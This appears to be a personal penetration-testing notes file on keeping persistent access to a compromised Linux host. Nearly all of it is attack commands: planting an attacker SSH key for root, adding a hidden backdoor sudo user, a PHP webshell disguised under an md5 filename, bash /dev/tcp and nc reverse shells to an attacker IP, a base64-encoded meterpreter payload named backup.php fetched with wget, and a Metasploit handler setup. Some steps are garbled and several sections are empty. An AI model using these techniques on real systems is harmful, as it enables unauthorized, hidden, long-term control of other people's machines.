change root user's password
```shell
# root$ 
passwd

```
### 2. using SSH

2. create an ssh key for root user
```
ssh-keygen -t rsa -b 4096 -C "root@attacker.com"
```

```
PUBKEY='pubkey>snip'

mkdir -p /root/.ssh/authorized_keys

chown root:root /root/.ssh
chmod 700 /root/.ssh

echo "$PUBKEY" > /root/.ssh/authorized_keys/rootkey.pub 
```

```
echo "$PUBKEY" > /home/victim/.ssh/authorized_keys
chown root:root /root/.ssh/authorized_keys
```

Create a user and add to sudo group.
```
sudo useradd vipa0z
```
add to sudo group
```
sudo usermod -aG sudo vipa0z
# or sudo useradd vipa0z sudo
```

2. copy bash to a rootbash file with s flag set chmod +s
-------------
### FAST Reverse shell Persistence via webshell

3. simple bash command to connect to attacker via webshell
```
<?php system($_REQUEST[cmd]); ?>
echo `StrongPass123' | md5sum
mv shell.php <md5>.php
```
move to web root
```
mv md5.php /var/www/html
```

browse url  over burp and add revshell command
DONT FORGET TO URL ENCODE
```
http://site:port/md5.php?cmd=bash -c "bash -i >&  /dev/tcp/10.10.x.x/9001 0>&1"'
```




----


---
### 3. Using systemd

---
### 4. script with nc
```
nc -e /bin/bash ip port 2>/dev/null &
```


### 5. webshell + meterpreter + backdoor user
```
sudo useradd vipa0z
```
add to sudo
```
sudo useradd vipa0z sudo
```

generate meterpreter webshell
```
msfvenom -p /php/meterpreter/reverse_tcp LHOST= ip LPORT=4444 -e php/base64 -f raw > backup.php
```
![[Pasted image 20251005175144.png]]
open the output .php file and add php wrapper
```
<?php 

?>
```
![[Pasted image 20251005175235.png]]
copy to /var/www/html on target.
 ```
 wget http://10.10.x.x:8000/backup.php
 mv backup.php /var/www/html/backup.php
 ```
#### setup metrepreter
```
msfconsole
run multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST= 10.10.x.x
set LPORT=4444
run
 
```
browse to backup.php to trigger the shell.

switch to backdoor user
```
su vipa0z
```

### via cronjobs
undocumented

### Lesser known techniques (john hammond + blackhat)